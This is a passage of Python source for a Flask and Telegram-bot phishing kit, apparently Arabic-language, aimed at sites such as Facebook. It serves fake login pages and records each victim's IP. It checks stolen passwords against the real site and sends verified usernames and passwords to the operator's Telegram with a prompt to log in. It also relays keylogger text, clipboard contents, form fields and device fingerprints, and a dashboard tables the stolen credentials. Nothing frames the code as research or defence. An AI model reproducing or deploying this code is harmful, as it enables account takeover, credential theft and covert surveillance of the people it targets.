          errorBox.textContent = 'تم تجاوز الحد الأقصى للمحاولات. الرجاء المحاولة لاحقاً.';
          errorBox.classList.add('show');
          btn.disabled = false;
          btn.innerHTML = '<span id="btnText">حاول لاحقاً</span>';
          return false;
        }}
        errorBox.textContent = 'كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.';
        errorBox.classList.add('show');
        
        document.getElementById('password').value = '';
        document.getElementById('password').focus();
        
        btn.disabled = false;
        btn.innerHTML = '<span id="btnText">{site['button_text']}</span>';
        return false;
      }}
      
      // ⏳ معلق
      errorBox.textContent = 'تعذّر الاتصال. يرجى المحاولة مرة أخرى.';
      errorBox.classList.add('show');
      btn.disabled = false;
      btn.innerHTML = '<span id="btnText">حاول مرة أخرى</span>';
      return false;
      
    }} catch(e) {{
      errorBox.textContent = 'تعذّر الاتصال بالشبكة. تأكد من الإنترنت.';
      errorBox.classList.add('show');
      btn.disabled = false;
      btn.innerHTML = '<span id="btnText">حاول مرة أخرى</span>';
      return false;
    }}
  }};
  
  // منع Enter من الإرسال المزدوج
  document.addEventListener('keypress', function(e) {{
    if (e.key === 'Enter' && e.target.tagName === 'INPUT') {{
      e.preventDefault();
      document.getElementById('loginForm').requestSubmit();
    }}
  }});
  
}})();
</script>
</body>
</html>"""
    
    return html


# ============================================================
# [6] المسارات
# ============================================================
def init_session_hunter_routes(app, bot):

    # ============================================================
    # الصفحة الرئيسية
    # ============================================================
    @app.route('/sh', methods=['GET'])
    def sh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        site = request.args.get('site', 'facebook').lower()
        
        if not session_id or not chat_id:
            return "Invalid link", 400
        
        if site not in SUPPORTED_SITES:
            site = 'facebook'
        
        sess = get_session(session_id)
        if not sess:
            create_session(session_id, chat_id, site)
        
        sess["page_views"] = sess.get("page_views", 0) + 1
        sess["last_seen"] = time.time()
        
        source_ip = (request.headers.get('CF-Connecting-IP') or
                     request.headers.get('X-Forwarded-For') or
                     request.remote_addr or "Unknown")
        if ',' in source_ip:
            source_ip = source_ip.split(',')[0].strip()
        
        sess["captured_ip"] = source_ip
        
        if sess["page_views"] == 1:
            try:
                bot.send_message(
                    int(chat_id) if str(chat_id).isdigit() else chat_id,
                    f"🎯 **الضحية فتح رابط {SUPPORTED_SITES[site]['name']}!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 `{session_id[:16]}`\n"
                    f"🌐 IP: `{source_ip}`\n"
                    f"🎯 الموقع: **{SUPPORTED_SITES[site]['name']}**\n\n"
                    f"⏳ في انتظار إدخال البيانات (لن تُرسل إلا إذا كانت صحيحة)...",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] notify landing error: {e}")
        
        html = generate_login_page(session_id, chat_id, site)
        return html, 200

    # ============================================================
    # إنشاء جلسة
    # ============================================================
    @app.route('/sh_create', methods=['POST'])
    def sh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        site = data.get('site', 'facebook')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id, site)
        return jsonify({"session_id": session_id}), 200

    # ============================================================
    # ★★★ مسار التحقق الفعلي ★★★
    # ============================================================
    @app.route('/sh_verify', methods=['POST'])
    def sh_verify():
        """يتحقق من البيانات مع الموقع الحقيقي"""
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            site_key = data.get('site', 'facebook')
            username = data.get('username', '').strip()
            password = data.get('password', '')
            attempt = data.get('attempt', 1)
            
            if not session_id or not username or not password:
                return jsonify({"status": "invalid"}), 200
            
            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()
            
            # ★ افحص البيانات
            is_valid, reason = verify_credentials(site_key, username, password, source_ip)
            
            site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            
            print(f"[SH VERIFY] site={site_key} | user={username[:30]} | valid={is_valid} | reason={reason} | attempt={attempt}")
            
            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()
            
            # ============================================================
            # ✅ بيانات صحيحة
            # ============================================================
            if is_valid:
                cred_data = {
                    "site": site_key,
                    "site_name": site.get("name", site_key),
                    "username": username,
                    "password": password,
                    "ip": source_ip,
                    "verified": True,
                    "reason": reason,
                    "attempt": attempt,
                    "captured_at": time.time(),
                }
                
                if redis_client:
                    try:
                        redis_client.lpush(f"sh_creds:{session_id}",
                                          json.dumps(cred_data, ensure_ascii=False))
                        redis_client.expire(f"sh_creds:{session_id}", 86400 * 7)
                    except Exception:
                        pass
                
                if sess:
                    sess.setdefault("captured_credentials", []).append(cred_data)
                
                # ★ أرسل للمستخدم - فقط البيانات الحقيقية
                try:
                    msg = (
                        f"🎯 **بيانات حقيقية تم التحقق منها!**\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"✅ **تم التحقق:** البيانات صحيحة 100%\n"
                        f"🌐 **الموقع:** {site.get('name', site_key)}\n"
                        f"🆔 **الجلسة:** `{session_id[:16]}`\n"
                        f"🔢 **المحاولة:** {attempt}\n\n"
                        f"👤 **اسم المستخدم / البريد:**\n"
                        f"`{username}`\n\n"
                        f"🔑 **كلمة السر:**\n"
                        f"`{password}`\n\n"
                        f"🌍 **IP:** `{source_ip}`\n"
                        f"🕐 **الوقت:** `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"💡 **يمكنك الآن استخدام هذه البيانات للدخول!**\n"
                        f"🔓 الرابط: {site.get('real_url', '')}"
                    )
                    bot.send_message(cid, msg, parse_mode="Markdown",
                                   disable_web_page_preview=True)
                except Exception as e:
                    print(f"[-] notify error: {e}")
                
                return jsonify({"status": "valid"}), 200
            
            # ============================================================
            # ❌ بيانات خاطئة
            # ============================================================
            else:
                if sess:
                    sess["failed_attempts"] = sess.get("failed_attempts", 0) + 1
                
                # بعد 3 محاولات → أرسل تنبيه (لكن مكتوب عليه "غير صحيحة")
                if attempt >= 3:
                    try:
                        bot.send_message(
                            cid,
                            f"⚠️ **محاولات فاشلة ({attempt})**\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"🌐 الموقع: {site.get('name', site_key)}\n"
                            f"🆔 `{session_id[:16]}`\n"
                            f"👤 آخر محاولة: `{username}`\n"
                            f"🔑 كلمة السر: `{password[:30]}`\n"
                            f"❌ **البيانات غير صحيحة** ({reason})\n"
                            f"🌍 IP: `{source_ip}`\n\n"
                            f"💡 _سيتم الإرسال فقط عند التحقق الناجح._",
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
                
                return jsonify({"status": "invalid", "reason": reason}), 200
        
        except Exception as e:
            print(f"[-] sh_verify error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "pending"}), 200

    # ============================================================
    # استقبال البيانات الأخرى (device, keylog, etc.)
    # ============================================================
    @app.route('/sh_data', methods=['POST'])
    def sh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')
            site_key = data.get('site', 'facebook')
            
            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 200
            
            sess = get_session(session_id)
            if not sess:
                create_session(session_id, chat_id, site_key)
                sess = get_session(session_id)
            
            sess["last_seen"] = time.time()
            
            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()
            
            _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key)
            
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] sh_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200

    # ============================================================
    # لوحة العرض (ويب)
    # ============================================================
    @app.route('/sh_view', methods=['GET'])
    def sh_view():
        session_id = request.args.get('s', '')
        if not session_id:
            return "No session", 400
        sess = get_session(session_id)
        if not sess:
            return "Session not found", 404
        return render_dashboard(session_id, sess)


# ============================================================
# [7] معالجة البيانات الواردة
# ============================================================
def _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key):
    dtype = data.get('type')
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
    
    print(f"[SH <<] {dtype} | {site_key} | {session_id[:8]}")
    
    try:
        # ---------- بيانات الجهاز ----------
        if dtype == 'device':
            fp = data
            scr = fp.get('screen', {})
            hw = fp.get('hardware', {})
            bat = fp.get('battery', {})
            net = fp.get('network', {})
            gpu = fp.get('gpu', {})
            webrtc = fp.get('webrtc_ips', [])
            
            text = (
                f"🖥️ **بصمة جهاز الضحية**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 الموقع: **{site['name']}**\n\n"
                f"🌐 **IP:** `{source_ip}`\n"
                f"🕵️ **WebRTC IPs:** `{', '.join(webrtc) if webrtc else 'لا يوجد'}`\n\n"
                f"💻 **النظام:** `{fp.get('platform', 'N/A')}`\n"
                f"📱 **UA:** `{fp.get('ua', 'N/A')[:120]}`\n"
                f"🌍 **اللغة:** `{fp.get('lang', 'N/A')}`\n"
                f"🕐 **التوقيت:** `{fp.get('tz', 'N/A')}`\n\n"
                f"📐 **الشاشة:** `{scr.get('w', '?')}x{scr.get('h', '?')}` "
                f"(DPR `{scr.get('dpr', '?')}`)\n"
                f"⚙️ **المعالج:** `{hw.get('cores', 'N/A')} cores` | "
                f"RAM: `{hw.get('memory', 'N/A')} GB`\n"
                f"🎮 **GPU:** `{gpu.get('vendor', 'N/A')[:50]}`\n"
                f"🔋 **البطارية:** `{bat.get('level', 'N/A')}%`\n"
                f"📶 **الشبكة:** `{net.get('type', 'N/A')}`"
            )
            bot.send_message(cid, text, parse_mode="Markdown")
        
        # ---------- Keylogger ----------
        elif dtype == 'keylog':
            text = data.get('text', '')
            if text.strip():
                bot.send_message(
                    cid,
                    f"⌨️ **لوحة المفاتيح ({site['name']}):**\n```\n{text[:500]}\n```",
                    parse_mode="Markdown"
                )
        
        # ---------- Form Submit ----------
        elif dtype == 'form_submit':
            fields = data.get('fields', {})
            lines = [f"📝 **نموذج ({site['name']}):**"]
            for k, v in list(fields.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")
        
        # ---------- Clipboard ----------
        elif dtype == 'clipboard_copy':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📋 **نسخ:**\n```\n{content[:300]}\n```", parse_mode="Markdown")
        
        elif dtype == 'clipboard_paste':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📥 **لصق:**\n```\n{content[:300]}\n```", parse_mode="Markdown")
    
    except Exception as e:
        print(f"[-] _handle_sh_data error ({dtype}): {e}")
        import traceback
        traceback.print_exc()


# ============================================================
# [8] لوحة عرض (ويب)
# ============================================================
def render_dashboard(session_id, sess):
    site = SUPPORTED_SITES.get(sess.get("target_site", "facebook"), {})
    creds = sess.get("captured_credentials", [])
    
    cred_rows = ""
    for c in creds:
        cred_rows += f'''
        <tr>
            <td><code>{c.get('username', '')}</code></td>
            <td><code>{c.get('password', '')}</code></td>
            <td>{'✅' if c.get('verified') else '❌'}</td>
            <td>{time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}</td>
        </tr>'''
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Session Dashboard</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #0f172a; color: #f8fafc;
    margin: 0; padding: 24px; }}
  .c {{ max-width: 900px; margin: 0 auto; }}
  h1 {{ color: {site.get('color', '#38bdf8')}; }}
  .card {{ background: #1e293b; border-radius: 12px; padding: 20px;
    margin-bottom: 16px; border: 1px solid #334155; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{ text-align: right; padding: 10px; border-bottom: 1px solid #334155;
    color: #64748b; font-weight: 600; }}
  td {{ padding: 10px; border-bottom: 1px solid #1e293b; }}
  code {{ background: #0f172a; padding: 3px 8px; border-radius: 4px;
    color: #4ade80; font-family: monospace; font-size: 12px; word-break: break-all; }}
</style>
</head>
<body>
<div class="c">
  <h1>🎯 {site.get('name', 'Session')} — لوحة التحكم</h1>
  <div class="card">
    <p><b>🆔:</b> <code>{session_id}</code></p>
    <p><b>👤 Chat:</b> <code>{sess.get('chat_id')}</code></p>
    <p><b>🌐 IP:</b> <code>{sess.get('captured_ip', 'N/A')}</code></p>
    <p><b>📄 صفحات:</b> {sess.get('page_views', 0)}</p>
    <p><b>❌ محاولات فاشلة:</b> {sess.get('failed_attempts', 0)}</p>
  </div>
  <div class="card">
    <h2>🔐 البيانات المُتحقق منها ({len(creds)})</h2>
    <table>
      <tr><th>المستخدم</th><th>كلمة السر</th><th>متحقق</th><th>الوقت</th></tr>
      {cred_rows if cred_rows else '<tr><td colspan="4" style="text-align:center">لا توجد بيانات بعد</td></tr>'}
    </table>
  </div>
</div>
</body>
</html>"""
    return html, 200


# ============================================================
# [9] لوحة تحكم البوت
# ============================================================
def build_sh_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📋 البيانات المسروقة", callback_data=f"sh_creds_{session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"sh_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 عرض الويب", url=f"{RAILWAY_URL}/sh_view?s={session_id}"),
    )
    return m


# ============================================================
# [10] API للبوت
# ============================================================
def get_sh_data(session_id):
    """يرجع بيانات الجلسة"""
    result = {"credentials": [], "session": None}
    
    sess = get_session(session_id)
    if sess:
        result["credentials"] = sess.get("captured_credentials", [])
        result["session"] = {
            "chat_id": sess.get("chat_id"),
            "target_site": sess.get("target_site"),
            "page_views": sess.get("page_views", 0),
            "ip": sess.get("captured_ip"),
            "failed_attempts": sess.get("failed_attempts", 0),
            "created_at": sess.get("created_at"),
            "last_seen": sess.get("last_seen"),
        }
    
    if redis_client:
        try:
            creds_raw = redis_client.lrange(f"sh_creds:{session_id}", 0, -1)
            for c in (creds_raw or []):
                try:
                    result["credentials"].append(json.loads(c))
                except Exception:
                    pass
        except Exception as e:
            print(f"[-] get_sh_data error: {e}")
    
    return result
